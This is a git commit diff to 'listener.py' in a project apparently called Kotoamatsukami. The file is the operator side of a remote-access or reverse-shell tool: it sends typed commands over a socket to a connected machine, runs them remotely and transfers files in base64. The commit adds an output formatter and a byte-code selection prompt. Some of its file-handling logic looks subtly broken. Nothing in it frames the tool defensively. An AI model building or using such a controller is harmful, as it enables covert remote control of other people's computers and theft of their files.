b661c5be50680c7712ab5f4044a7e44b715f7413
RockBlet <belyakove31@gmail.com>
2023-01-12 02:37:56 +0300

    add output function ., add byte code choise function ., replace prints on output function

--- Kotoamatsukami/listener.py
+++ Kotoamatsukami/listener.py
@@ -42,7 +42,6 @@ class Listener:
         json_data = json.dumps(data)
         json_data = json_data.encode("utf-8")
         self.connection.send(json_data)
-        print(f"[+] rel send -> {data}")
 
     def reliable_receive(self):
         json_data = ""
@@ -50,9 +49,25 @@ class Listener:
             try:
                 json_data = json_data + self.connection.recv(1024).decode("utf-8")
                 return json.loads(json_data)
-                print(f"[+] rcv -> {json.loads(json_data)}")
             except ValueError:
                 continue
+
+    def output(self, **kwargs):
+        for object in kwargs:
+            print("\n")
+            if object == "S":
+                print(f"[S:] -> {kwargs[object]}")
+
+            elif object == "R":
+                print("[R:] <- {")
+                print(kwargs[object])
+                print("}-...")
+
+            elif object == "N":
+                print(f"[N:] {kwargs[object]}")
+
+            else:
+                print(object,"-{\n", kwargs[object], "\n}")
 
     def execute_remotely(self, command):
         try:
@@ -63,23 +78,40 @@ class Listener:
         except AttributeError:
             return f"[-] AttributeError in -> {command}"
 
-    def write_file(self, path, content):
+    def read_file(self, path: str) -> str:
+        with open(path, 'rb') as file:
+            self.reliable_send(base64.b64encode(file.read()))
+            return base64.b64encode(file.read())
+
+    def write_file(self, path: str, content: base64) -> str:
         with open(path, "wb") as file:
             file.write(base64.b64decode(content))
-            return "[+] Download successful"
+        return f"[+] Upload successful -> {path}"
 
-    def read_file(self, path):
-        with open(path, 'rb')as file:
-            return base64.b64encode(file.read())
+    def getCodeType(self):
+        title = str(input("[!] title -> "))
+        self.reliable_send(title)
+        code_expm = self.reliable_receive()
+        print("\n")
+        print("[Choise Byte type]...")
+        for i in code_expm:
+            print(i)
+        print("...[|||||||||||||||||]")
+
+        code_type = str(input("[!] code type -> "))
+        self.reliable_send(code_type)
 
     def run(self):
         try:
+            self.getCodeType()
+
             while True:
                 command = str(input(">> "))
 
                 try:
                     if command[0] == "download":
                         print(f"[+] Downloading file as {command[1]}")
+                        self.execute_remotely("download", [command[1]])
                         result = self.write_file(command[1], result)
 
                     if command[0] == "upload" and "[-] Error" not in result:
@@ -91,8 +123,7 @@ class Listener:
                     print(result)
 
                 result = self.execute_remotely(command)
-                print(f"[!] result type -> {type(result)}")
-                print(f"\n[result]\n{result}\n[#####]\n")
+                self.output(S=command, R=result)
 
         except KeyboardInterrupt:
             print("\n[-] Quiting")
